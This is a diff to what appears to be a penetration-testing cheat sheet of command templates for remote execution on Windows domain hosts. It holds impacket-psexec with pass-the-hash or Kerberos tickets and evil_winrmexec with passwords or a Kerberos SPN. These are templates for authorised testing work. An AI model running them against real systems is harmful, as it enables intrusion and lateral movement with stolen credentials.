@@ -20,7 +20,7 @@ impacket-psexec -hashes <hash> '<user>'@<ip>
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
 create a new service (using \pipe\svcctl via SMB)
 ```
-export KRB5CCNAME=<ccache_file>; impacket-psexec -dc-ip <dc_ip> -target-ip <ip> -no-pass -k <domain>/'<user>'@<target_name>
+export KRB5CCNAME=<ccache_file>; impacket-psexec -k -no-pass <dc> -dc-ip <dc_ip>
 ```
 
 ## SMBEXEC with username
@@ -93,9 +93,9 @@ impacket-wmiexec -hashes '<HASH>' '<USERNAME>@<DC>'
 evil_winrmexec.py <DOMAIN>@<USERNAME>:'<PASSWORD>'@<DC>
 ```
 
-## evil_winrmexec - login with creds
+## evil_winrmexec - Kerberos SPN
 ```
-evil_winrmexec.py <DOMAIN>@<USERNAME>:'<PASSWORD>'@<DC>
+evil_winrmexec.py <DOMAIN>/'<USERNAME>'@<dc_ip> -k -no-pass -spn <SPN>
 ```
 
 ## evil_winrmexec - login with Kerberos
